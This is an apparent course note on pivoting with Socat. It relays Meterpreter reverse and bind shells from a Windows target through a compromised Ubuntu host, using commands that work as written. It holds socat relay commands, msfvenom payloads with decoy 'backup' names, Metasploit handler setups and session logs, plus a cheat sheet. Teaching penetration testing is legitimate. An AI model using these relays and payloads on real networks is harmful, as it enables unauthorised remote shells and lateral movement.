## 1. Introduction

The previous notes on pivoting relied on SSH (or Meterpreter's own forwarding features) to relay traffic through a pivot host. This section introduces **Socat**, a tool that accomplishes the same basic goal — relaying a connection through a pivot — but without needing SSH access at all. This matters because SSH credentials aren't always available on a pivot host, even when some other way of running a simple standalone tool is.

**Machine labels used throughout this section (consistent with the previous pivoting notes):**

| Label | Role |
|---|---|
| **HACKER** | Your own attack machine |
| **PIVOT** | The compromised Ubuntu server, with a connection to both HACKER's network and the internal network |
| **WINDOWS_TARGET** | The Windows machine on the internal network, reachable only through PIVOT |

---

## 2. What Is Socat?

**Socat** is a bidirectional relay tool — it creates a "pipe" between two independent network connections, so that data flowing into one side comes back out the other, and vice versa. Unlike the SSH-based forwarding covered earlier, Socat doesn't need an SSH tunnel at all; it just needs to run as its own standalone process on the pivot host.

Think of Socat as a simple adapter plug: on one side it listens for a connection on a given host and port, and on the other side it immediately forwards whatever it receives to a completely different host and port. Neither side needs to know anything about the other — Socat just quietly glues the two connections together.

## 3. Socat Redirection with a Reverse Shell

**Goal:** get a Meterpreter reverse shell from WINDOWS_TARGET back to HACKER, relayed through PIVOT — but using Socat instead of an SSH remote forward.

**Step 1 — On PIVOT: start the Socat listener/relay.**
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- `TCP4-LISTEN:8080` tells Socat to listen on port 8080. `fork` makes Socat spawn a new process to handle each incoming connection, so it can keep accepting further connections rather than only handling one at a time.
- `TCP4:10.10.14.18:80` is the destination side — Socat immediately forwards anything it receives on port 8080 onward to HACKER's address on port 80.
- In short: anything arriving at PIVOT's port 8080 is relayed straight through to HACKER's port 80.

**Step 2 — On HACKER: build a Windows payload configured to connect to PIVOT (not HACKER directly).**
```
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

Saved as: backupscript.exe
```
*`LHOST=172.16.5.129` is PIVOT's internal-facing address — WINDOWS_TARGET can only route to PIVOT, not to HACKER directly, so the payload must be told to call back there instead. `LPORT=8080` matches the port Socat is listening on in Step 1.*

> **Reminder:** this payload still needs to actually get onto WINDOWS_TARGET somehow — any of the file transfer techniques from earlier sections (web download, SCP to PIVOT plus a quick web server, etc.) can be reused here; getting the payload onto the target and setting up the redirector are two separate steps.

**Step 3 — On HACKER: start a Metasploit listener to catch the relayed connection.**
```
$ sudo msfconsole

msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```
*The listener's port (80) matches the destination Socat was configured to forward to in Step 1 — this is the piece that actually ties the whole chain together: WINDOWS_TARGET → PIVOT:8080 (Socat) → HACKER:80 (Metasploit listener).*

**Step 4 — Execute the payload on WINDOWS_TARGET, and confirm the session arrives.**
```
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: EVIL_CORP\victor
```
- Notice the connection is shown as coming from `10.129.202.64` — that's PIVOT's address, not WINDOWS_TARGET's — because as far as HACKER's listener is concerned, the connection genuinely originated at PIVOT; Socat relayed it there without preserving the original source address.
- `getuid` confirms the session landed as the `victor` user on the `EVIL_CORP` domain — the Windows target the payload was executed on.

## 4. Socat Redirection with a Bind Shell

A **bind shell** flips the connection direction compared to a reverse shell: instead of WINDOWS_TARGET reaching *out* to connect somewhere, WINDOWS_TARGET itself opens a listener and waits for an incoming connection to *it*. This matters in scenarios where outbound connections from WINDOWS_TARGET are restricted, but something can still reach in to connect to it directly (at least from within the internal network).

Socat can relay this too — just configured in the opposite direction from the reverse shell example.

**Step 1 — On HACKER: build a Windows bind shell payload.**
```
$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

Saved as: backupjob.exe
```
*Notice there's no `LHOST` here — a bind payload doesn't need to know where to connect *to*, since it's the one doing the listening. `LPORT=8443` is the port it will listen on once executed on WINDOWS_TARGET.*

**Step 2 — On PIVOT: start a Socat relay pointed *at* WINDOWS_TARGET's bind port.**
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
- This time, the roles are reversed from the earlier example: Socat listens on PIVOT's port 8080 (reachable from HACKER), and forwards anything it receives onward to WINDOWS_TARGET's address on port 8443 — the port the bind payload will be listening on.
- In other words, this Socat instance acts as a relay *into* the internal network, rather than *out of* it.

**Step 3 — On HACKER: configure a Metasploit bind handler pointed at PIVOT's relay (not directly at WINDOWS_TARGET).**
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```
- `RHOST 10.129.202.64` is PIVOT's address — because a bind handler needs to know where to *connect to*, and HACKER can only directly reach PIVOT, not WINDOWS_TARGET.
- `LPORT 8080` matches the Socat listener's port from Step 2.
- The overall chain: HACKER's bind handler connects to PIVOT:8080 (Socat) → Socat forwards that connection onward to WINDOWS_TARGET:8443, where the bind payload is waiting.

**Step 4 — Execute the bind payload on WINDOWS_TARGET, and confirm the session connects.**
```
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: EVIL_CORP\victor
```
*The session details show HACKER (`10.10.14.18`) connecting out to PIVOT's relay (`10.129.202.64:8080`) — matching the bind handler's configuration from Step 3 — and `getuid` again confirms the session landed on the Windows target as the `victor` user.*

## 5. Reverse vs. Bind: Side-by-Side

| Aspect | Reverse Shell (via Socat) | Bind Shell (via Socat) |
|---|---|---|
| Who initiates the connection? | WINDOWS_TARGET connects out | HACKER (via PIVOT) connects in |
| Where does Socat's "destination" point? | Toward HACKER | Toward WINDOWS_TARGET |
| Payload needs `LHOST`? | Yes (set to PIVOT's address) | No (bind payloads don't call out anywhere) |
| Metasploit handler setting | `set lhost 0.0.0.0` (just listens) | `set RHOST <pivot address>` (actively connects) |
| Best suited for... | Targets that allow outbound connections but may restrict inbound ones | Targets reachable inbound from the internal network, but with restricted/monitored outbound traffic |

## 6. Decision Flow: Reverse or Bind Shell Through Socat?

```
                 ┌─────────────────────────────────┐
                 │ Need a shell on WINDOWS_TARGET, │
                 │ relayed through PIVOT, without  │
                 │ using SSH forwarding?           │
                 └──────────────────┬──────────────┘
                                    │
             ┌──────────────────────┴───────────────────────┐
             │                                              │
  Outbound connections FROM                      Outbound connections FROM
  WINDOWS_TARGET are allowed                      WINDOWS_TARGET are restricted,
  (even if monitored)                              but inbound connections work
             │                                              │
             ▼                                              ▼
 ┌─────────────────────────┐                  ┌───────────────────────────┐
 │ Use a REVERSE shell:    │                  │ Use a BIND shell:         │
 │ Socat listens on PIVOT, │                  │ Socat on PIVOT forwards   │
 │ forwards to HACKER's    │                  │ toward WINDOWS_TARGET's   │
 │ Metasploit listener     │                  │ bind port; HACKER's bind  │
 │                         │                  │ handler connects to PIVOT │
 └─────────────────────────┘                  └───────────────────────────┘
```

## 7. Cheat Sheet

| Goal | Run on | Key Command |
|---|---|---|
| Socat relay for a reverse shell | PIVOT | `socat TCP4-LISTEN:LOCAL_PORT,fork TCP4:HACKER_IP:HACKER_PORT` |
| Socat relay for a bind shell | PIVOT | `socat TCP4-LISTEN:LOCAL_PORT,fork TCP4:TARGET_IP:TARGET_PORT` |
| Build a Windows reverse HTTPS payload | HACKER | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot_ip> LPORT=<socat_listen_port> -f exe -o file.exe` |
| Build a Windows bind TCP payload | HACKER | `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o file.exe LPORT=<target_bind_port>` |
| Start a reverse handler | HACKER (msfconsole) | `set payload windows/x64/meterpreter/reverse_https`; `set lhost 0.0.0.0`; `set lport <port socat forwards to>`; `run` |
| Start a bind handler | HACKER (msfconsole) | `set payload windows/x64/meterpreter/bind_tcp`; `set RHOST <pivot_ip>`; `set LPORT <socat_listen_port>`; `run` |
| Confirm session identity | either (meterpreter) | `getuid` |

## 8. Big-Picture Takeaways

1. **Socat accomplishes the same relaying goal as SSH forwarding, with a different dependency.** Where SSH-based pivoting needs valid SSH credentials on the pivot host, Socat only needs to be able to run as a standalone process there — useful when SSH access isn't available but some form of command execution is.
2. **Reverse and bind shells require mirrored Socat configurations.** For a reverse shell, Socat listens toward the attacker and forwards toward the target's network; for a bind shell, Socat listens toward the attacker's side too, but forwards *into* the target's network instead — the listening side stays the same, but the forwarding direction flips.
3. **The apparent source of a relayed connection is the pivot, not the original target.** Both examples show Metasploit reporting PIVOT's IP address as the connecting host, not WINDOWS_TARGET's — a detail worth remembering both when interpreting session logs as an attacker and when investigating suspicious local relays as a defender.
4. **Payload type dictates whether `LHOST` is even relevant.** Reverse payloads need to know where to call back to (`LHOST`), while bind payloads don't — they simply wait to be connected to, which is also why the handler configuration differs (`lhost 0.0.0.0` vs. `set RHOST`).
5. **Choosing reverse vs. bind is a direct reflection of the target network's outbound/inbound restrictions**, exactly as it was in the SSH-based pivoting notes — Socat doesn't change that underlying decision, it just offers another mechanism for implementing whichever direction is actually viable.
6. **`fork` is a small but essential detail.** Without it, Socat would only ever handle a single connection before exiting — appending `fork` is what allows it to keep relaying multiple connections over time, which matters if a payload needs to be retried or if multiple shells are expected.
